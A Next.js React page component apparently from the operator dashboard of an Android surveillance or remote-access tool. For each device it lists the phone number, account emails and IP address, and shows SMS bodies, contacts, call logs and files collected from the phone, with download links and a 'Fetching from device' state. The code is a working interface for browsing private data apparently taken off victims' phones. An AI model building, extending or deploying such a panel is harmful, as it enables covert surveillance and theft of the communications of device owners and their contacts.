"use client";

import { useState } from "react";
import { useParams, useRouter } from "next/navigation";
import { useDevice, useDeleteDevice, useDeviceSms, useDeviceContacts, useDeviceFiles, useDeviceCallLogs } from "@/hooks/useDevices";
import { StatusBadge } from "@/components/shared/status-badge";
import { LoadingSpinner } from "@/components/shared/loading-spinner";
import { ErrorState } from "@/components/shared/error-state";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Separator } from "@/components/ui/separator";
import { Badge } from "@/components/ui/badge";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { formatDate } from "@/lib/utils";
import {
  FiSmartphone, FiArrowLeft, FiTrash2, FiGlobe, FiHash,
  FiCpu, FiPackage, FiClock, FiCalendar, FiActivity,
  FiMessageSquare, FiUsers, FiFolder, FiMail, FiPhone, FiPhoneCall,
} from "react-icons/fi";

const API_BASE = process.env.NEXT_PUBLIC_API_URL || "http://localhost:5000/api";

type Tab = "info" | "sms" | "contacts" | "files" | "calllogs";

function formatDateTime(ts: number | string | null | undefined): string {
  if (ts === null || ts === undefined || ts === 0 || ts === "0") return "\u2014";
  const num = Number(ts);
  if (isNaN(num) || num <= 0) return "\u2014";
  const d = new Date(num);
  if (isNaN(d.getTime())) return "\u2014";
  return d.toLocaleString("en-US", {
    year: "numeric", month: "short", day: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
  });
}

function formatFileSize(bytes: number): string {
  if (!bytes || bytes <= 0) return "0 B";
  const units = ["B", "KB", "MB", "GB"];
  let i = 0;
  let size = bytes;
  while (size >= 1024 && i < units.length - 1) { size /= 1024; i++; }
  return `${size.toFixed(i === 0 ? 0 : 1)} ${units[i]}`;
}

function formatDuration(seconds: number): string {
  if (!seconds || seconds <= 0) return "0:00";
  const m = Math.floor(seconds / 60);
  const s = Math.floor(seconds % 60);
  return `${m}:${s.toString().padStart(2, "0")}`;
}

function TabCount({ label, count, isLoading }: { label: string; count?: number; isLoading: boolean }) {
  return (
    <span className="ml-1 text-xs">
      {isLoading ? (
        <span className="inline-block w-6 h-3 bg-muted-foreground/20 rounded animate-pulse" />
      ) : count !== undefined ? (
        <Badge variant="secondary" className="text-xs">{count}</Badge>
      ) : null}
    </span>
  );
}

function CollectingState({ type }: { type: string }) {
  return (
    <div className="text-center py-12 space-y-3">
      <div className="flex justify-center">
        <div className="h-8 w-8 animate-spin rounded-full border-4 border-primary border-t-transparent" />
      </div>
      <p className="text-sm font-medium text-muted-foreground">
        Fetching {type} from device...
      </p>
      <p className="text-xs text-muted-foreground/60">
        Please wait 3-5 minutes. Data will appear automatically once collected.
      </p>
    </div>
  );
}

export default function DeviceDetailPage() {
  const params = useParams();
  const router = useRouter();
  const id = params.id as string;
  const [tab, setTab] = useState<Tab>("info");
  const [selectedSms, setSelectedSms] = useState<any>(null);

  const { data, isLoading, error, refetch } = useDevice(id);
  const device = data?.device;
  const deviceId = device?.deviceId || "";
  const deviceReady = !!deviceId;

  const isRecentlyActive = device?.lastSeen
    ? Date.now() - new Date(device.lastSeen).getTime() < 10 * 60 * 1000
    : true;

  const { data: smsData, isLoading: smsLoading } = useDeviceSms(deviceId);
  const { data: contactsData, isLoading: contactsLoading } = useDeviceContacts(deviceId);
  const { data: filesData, isLoading: filesLoading } = useDeviceFiles(deviceId);
  const { data: callLogsData, isLoading: callLogsLoading } = useDeviceCallLogs(deviceId);
  const deleteMutation = useDeleteDevice();

  if (isLoading) {
    return (
      <div className="flex h-[50vh] items-center justify-center">
        <LoadingSpinner size="lg" />
      </div>
    );
  }

  if (error || !device) {
    return (
      <ErrorState
        title="Device not found"
        message={error?.message || "The device you're looking for doesn't exist."}
        onRetry={() => refetch()}
      />
    );
  }

  const handleDelete = () => {
    deleteMutation.mutate(device.id, {
      onSuccess: () => router.push("/devices"),
    });
  };

  const tabs: { key: Tab; label: string; icon: React.ReactNode; count?: number; loading: boolean }[] = [
    { key: "info", label: "Info", icon: <FiSmartphone className="h-4 w-4" />, loading: false },
    { key: "sms", label: "SMS", icon: <FiMessageSquare className="h-4 w-4" />, count: smsData?.sms?.length, loading: smsLoading },
    { key: "contacts", label: "Contacts", icon: <FiUsers className="h-4 w-4" />, count: contactsData?.contacts?.length, loading: contactsLoading },
    { key: "files", label: "Files", icon: <FiFolder className="h-4 w-4" />, count: filesData?.files?.length, loading: filesLoading },
    { key: "calllogs", label: "Call Logs", icon: <FiPhoneCall className="h-4 w-4" />, count: callLogsData?.callLogs?.length, loading: callLogsLoading },
  ];

  const infoItems = [
    { label: "Device Name", value: device.deviceName, icon: FiSmartphone },
    { label: "Device ID", value: device.deviceId, icon: FiHash },
    { label: "Phone Number", value: device.phoneNumber || "\u2014", icon: FiPhone },
    { label: "Email", value: device.accountEmails?.join(", ") || "\u2014", icon: FiMail },
    { label: "Android Version", value: device.androidVersion || "\u2014", icon: FiCpu },
    { label: "App Version", value: device.appVersion || "\u2014", icon: FiPackage },
    { label: "IP Address", value: device.ipAddress || "\u2014", icon: FiGlobe },
    { label: "Status", value: "", icon: FiActivity, custom: <StatusBadge status={device.status} /> },
    { label: "Last Seen", value: formatDate(device.lastSeen), icon: FiClock },
    { label: "Created", value: formatDate(device.createdAt), icon: FiCalendar },
  ];

  return (
    <div className="space-y-6 max-w-4xl">
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
        <div className="flex items-center gap-3 min-w-0">
          <Button variant="ghost" size="icon" onClick={() => router.back()} className="shrink-0">
            <FiArrowLeft className="h-4 w-4" />
          </Button>
          <div className="min-w-0">
            <div className="flex items-center gap-3">
              <h1 className="text-2xl font-bold tracking-tight truncate">{device.deviceName}</h1>
              <Badge variant="outline" className="gap-1.5 text-xs shrink-0">
                <span className="relative flex h-2 w-2">
                  <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-green-400 opacity-75" />
                  <span className="relative inline-flex h-2 w-2 rounded-full bg-green-500" />
                </span>
                Live
              </Badge>
            </div>
            <p className="text-sm text-muted-foreground">Device details and collected data</p>
          </div>
        </div>
        <Button variant="destructive" size="sm" onClick={handleDelete} disabled={deleteMutation.isPending} className="shrink-0 self-start sm:self-auto">
          <FiTrash2 className="mr-2 h-4 w-4" />
          {deleteMutation.isPending ? "Deleting..." : "Delete Device"}
        </Button>
      </div>

      <div className="flex gap-1 border-b overflow-x-auto scrollbar-none">
        {tabs.map((t) => (
          <button
            key={t.key}
            onClick={() => setTab(t.key)}
            className={`flex items-center gap-2 px-4 py-2.5 text-sm font-medium border-b-2 transition-colors whitespace-nowrap shrink-0 ${
              tab === t.key
                ? "border-primary text-primary"
                : "border-transparent text-muted-foreground hover:text-foreground"
            }`}
          >
            {t.icon}
            {t.label}
            <TabCount label={t.label} count={t.count} isLoading={t.loading} />
          </button>
        ))}
      </div>

      {tab === "info" && (
        <Card className="overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-br from-primary/[0.02] to-transparent pointer-events-none" />
          <CardHeader className="relative">
            <CardTitle>Device Information</CardTitle>
          </CardHeader>
          <Separator />
          <CardContent className="pt-6 relative">
            <div className="grid gap-6 sm:grid-cols-2">
              {infoItems.map((item) => (
                <div key={item.label} className="flex items-start gap-3 group">
                  <div className="flex h-9 w-9 items-center justify-center rounded-xl bg-muted group-hover:bg-primary/10 transition-colors shrink-0">
                    <item.icon className="h-4 w-4 text-muted-foreground group-hover:text-primary transition-colors" />
                  </div>
                  <div className="min-w-0">
                    <p className="text-xs font-medium text-muted-foreground uppercase tracking-wider">{item.label}</p>
                    {item.custom || <p className="text-sm font-semibold mt-1 truncate">{item.value}</p>}
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      )}

      {tab === "sms" && (
        <Card className="overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-br from-primary/[0.02] to-transparent pointer-events-none" />
          <CardHeader className="relative">
            <CardTitle>SMS Messages {!smsLoading ? `(${smsData?.sms?.length || 0})` : ""}</CardTitle>
          </CardHeader>
          <Separator />
          <CardContent className="pt-6 relative">
            {smsLoading ? (
              <div className="space-y-3">
                {[...Array(5)].map((_, i) => (
                  <div key={i} className="flex items-start gap-3 p-3 rounded-lg bg-muted/30">
                    <div className="shimmer h-4 w-4 mt-1 shrink-0 rounded" />
                    <div className="flex-1 space-y-2">
                      <div className="shimmer h-4 w-32 rounded" />
                      <div className="shimmer h-3 w-full rounded" />
                      <div className="shimmer h-3 w-40 rounded" />
                    </div>
                  </div>
                ))}
              </div>
            ) : !smsData?.sms?.length ? (
              isRecentlyActive ? <CollectingState type="SMS messages" /> :
              <p className="text-sm text-muted-foreground text-center py-8">No SMS data collected</p>
            ) : (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {smsData.sms.map((msg: any, i: number) => (
                  <div
                    key={msg.id || i}
                    onClick={() => setSelectedSms(msg)}
                    className="flex items-start gap-3 p-3 rounded-xl bg-muted/30 cursor-pointer hover:bg-muted/50 transition-all duration-150 border border-transparent hover:border-border"
                  >
                    <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-primary/10 shrink-0 mt-0.5">
                      <FiMessageSquare className="h-4 w-4 text-primary" />
                    </div>
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center gap-2">
                        <span className="text-sm font-semibold">{msg.address || "Unknown"}</span>
                        <Badge variant={msg.type === 1 ? "default" : "secondary"} className="text-[10px] font-medium">
                          {msg.type === 1 ? "Inbox" : "Sent"}
                        </Badge>
                      </div>
                      <p className="text-sm text-muted-foreground truncate mt-0.5">{msg.body || "(empty)"}</p>
                      <p className="text-xs text-muted-foreground/70 mt-1">{formatDateTime(msg.date)}</p>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      )}

      {tab === "contacts" && (
        <Card className="overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-br from-primary/[0.02] to-transparent pointer-events-none" />
          <CardHeader className="relative">
            <CardTitle>Contacts {!contactsLoading ? `(${contactsData?.contacts?.length || 0})` : ""}</CardTitle>
          </CardHeader>
          <Separator />
          <CardContent className="pt-6 relative">
            {contactsLoading ? (
              <div className="space-y-3">
                {[...Array(5)].map((_, i) => (
                  <div key={i} className="flex items-start gap-3 p-3 rounded-lg bg-muted/30">
                    <div className="shimmer h-8 w-8 rounded-full shrink-0" />
                    <div className="flex-1 space-y-2">
                      <div className="shimmer h-4 w-40 rounded" />
                      <div className="shimmer h-3 w-28 rounded" />
                      <div className="shimmer h-3 w-36 rounded" />
                    </div>
                  </div>
                ))}
              </div>
            ) : !contactsData?.contacts?.length ? (
              isRecentlyActive ? <CollectingState type="contacts" /> :
              <p className="text-sm text-muted-foreground text-center py-8">No contacts collected</p>
            ) : (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {contactsData.contacts.map((c: any, i: number) => (
                  <div key={c.id || i} className="flex items-start gap-3 p-3 rounded-xl bg-muted/30 border border-transparent hover:border-border transition-all duration-150">
                    <div className="flex h-10 w-10 items-center justify-center rounded-full bg-gradient-to-br from-primary/20 to-primary/10 shrink-0">
                      <span className="text-sm font-bold text-primary">{(c.name || "?").charAt(0).toUpperCase()}</span>
                    </div>
                    <div className="min-w-0 flex-1">
                      <p className="text-sm font-semibold">{c.name || "Unknown"}</p>
                      {c.phone_number ? (
                        <div className="flex items-center gap-1.5 text-sm text-foreground mt-0.5">
                          <FiPhone className="h-3.5 w-3.5 text-muted-foreground shrink-0" />
                          <span className="font-medium">{c.phone_number}</span>
                        </div>
                      ) : (
                        <div className="flex items-center gap-1.5 text-sm text-muted-foreground mt-0.5">
                          <FiPhone className="h-3.5 w-3.5 shrink-0" />
                          <span className="italic">No number</span>
                        </div>
                      )}
                      {c.email && (
                        <div className="flex items-center gap-1.5 text-sm text-muted-foreground mt-0.5">
                          <FiMail className="h-3.5 w-3.5 shrink-0" />
                          <span>{c.email}</span>
                        </div>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      )}

      {tab === "files" && (
        <Card className="overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-br from-primary/[0.02] to-transparent pointer-events-none" />
          <CardHeader className="relative">
            <CardTitle>Files {!filesLoading ? `(${filesData?.files?.length || 0})` : ""}</CardTitle>
          </CardHeader>
          <Separator />
          <CardContent className="pt-6 relative">
            {filesLoading ? (
              <div className="space-y-3">
                {[...Array(5)].map((_, i) => (
                  <div key={i} className="flex items-start gap-3 p-3 rounded-lg bg-muted/30">
                    <div className="shimmer h-4 w-4 mt-1 shrink-0" />
                    <div className="flex-1 space-y-2">
                      <div className="shimmer h-4 w-3/4 rounded" />
                      <div className="shimmer h-3 w-full rounded" />
                      <div className="shimmer h-3 w-20 rounded" />
                    </div>
                  </div>
                ))}
              </div>
            ) : !filesData?.files?.length ? (
              isRecentlyActive ? <CollectingState type="files" /> :
              <p className="text-sm text-muted-foreground text-center py-8">No files collected</p>
            ) : (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {filesData.files.map((f: any, i: number) => (
                  <div key={f.id || i} className="flex items-start gap-3 p-3 rounded-xl bg-muted/30 border border-transparent hover:border-border transition-all duration-150">
                    <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-amber-500/10 shrink-0 mt-0.5">
                      <FiFolder className="h-4 w-4 text-amber-500" />
                    </div>
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center gap-2">
                        <p className="text-sm font-semibold truncate">{f.name}</p>
                        {f.id && (
                          <a
                            href={`${API_BASE}/device/file-content/${f.id}`}
                            download
                            className="shrink-0"
                          >
                            <Badge variant="outline" className="text-[10px] gap-1 cursor-pointer hover:bg-primary/10 transition-colors border-primary/30 text-primary">
                              <FiFolder className="h-3 w-3" /> Download
                            </Badge>
                          </a>
                        )}
                      </div>
                      <p className="text-xs text-muted-foreground truncate mt-0.5">{f.path || "\u2014"}</p>
                      <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs text-muted-foreground/70 mt-1.5">
                        <span className="font-medium">{f.is_directory ? "Directory" : formatFileSize(f.size)}</span>
                        <span>{formatDateTime(f.last_modified)}</span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      )}

      {tab === "calllogs" && (
        <Card className="overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-br from-primary/[0.02] to-transparent pointer-events-none" />
          <CardHeader className="relative">
            <CardTitle>Call Logs {!callLogsLoading ? `(${callLogsData?.callLogs?.length || 0})` : ""}</CardTitle>
          </CardHeader>
          <Separator />
          <CardContent className="pt-6 relative">
            {callLogsLoading ? (
              <div className="space-y-3">
                {[...Array(5)].map((_, i) => (
                  <div key={i} className="flex items-start gap-3 p-3 rounded-lg bg-muted/30">
                    <div className="shimmer h-4 w-4 mt-1 shrink-0" />
                    <div className="flex-1 space-y-2">
                      <div className="shimmer h-4 w-32 rounded" />
                      <div className="shimmer h-3 w-24 rounded" />
                      <div className="shimmer h-3 w-40 rounded" />
                    </div>
                  </div>
                ))}
              </div>
            ) : !callLogsData?.callLogs?.length ? (
              isRecentlyActive ? <CollectingState type="call logs" /> :
              <p className="text-sm text-muted-foreground text-center py-8">No call logs collected</p>
            ) : (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {callLogsData.callLogs.map((c: any, i: number) => (
                  <div key={c.id || i} className="flex items-start gap-3 p-3 rounded-xl bg-muted/30 border border-transparent hover:border-border transition-all duration-150">
                    <div className="flex h-8 w-8 items-center justify-center rounded-lg shrink-0 mt-0.5"
                      style={{
                        backgroundColor: c.type === 2 ? 'rgba(34,197,94,0.1)' : c.type === 1 ? 'rgba(59,130,246,0.1)' : 'rgba(239,68,68,0.1)'
                      }}
                    >
                      <FiPhoneCall className="h-4 w-4" style={{
                        color: c.type === 2 ? 'rgb(34,197,94)' : c.type === 1 ? 'rgb(59,130,246)' : 'rgb(239,68,68)'
                      }} />
                    </div>
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center gap-2">
                        <span className="text-sm font-semibold">{c.name || c.number || "Unknown"}</span>
                        <Badge variant={c.type === 1 ? "default" : c.type === 2 ? "secondary" : "outline"} className="text-[10px] font-medium">
                          {c.type === 1 ? "Incoming" : c.type === 2 ? "Outgoing" : "Missed"}
                        </Badge>
                      </div>
                      {c.number && c.name && (
                        <p className="text-xs text-muted-foreground mt-0.5">{c.number}</p>
                      )}
                      <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs text-muted-foreground/70 mt-1.5">
                        <span>{formatDateTime(c.date)}</span>
                        <span className="font-medium">{formatDuration(c.duration)}</span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      )}

      {/* SMS Detail Dialog */}
      <Dialog open={!!selectedSms} onOpenChange={(open) => !open && setSelectedSms(null)}>
        <DialogContent className="sm:max-w-lg">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <div className="flex h-7 w-7 items-center justify-center rounded-lg bg-primary/10">
                <FiMessageSquare className="h-4 w-4 text-primary" />
              </div>
              SMS Details
            </DialogTitle>
          </DialogHeader>
          {selectedSms && (
            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-1">
                  <p className="text-xs font-medium text-muted-foreground uppercase tracking-wider">From / To</p>
                  <p className="text-sm font-semibold">{selectedSms.address || "Unknown"}</p>
                </div>
                <div className="space-y-1">
                  <p className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Type</p>
                  <Badge variant={selectedSms.type === 1 ? "default" : "secondary"}>
                    {selectedSms.type === 1 ? "Inbox" : "Sent"}
                  </Badge>
                </div>
                <div className="col-span-2 space-y-1">
                  <p className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Date</p>
                  <p className="text-sm">{formatDateTime(selectedSms.date)}</p>
                </div>
              </div>
              <Separator />
              <div className="space-y-2">
                <p className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Message Body</p>
                <div className="rounded-xl bg-muted/50 border p-4 max-h-[300px] overflow-y-auto">
                  <p className="text-sm whitespace-pre-wrap break-words leading-relaxed">{selectedSms.body || "(empty)"}</p>
                </div>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

    </div>
  );
}
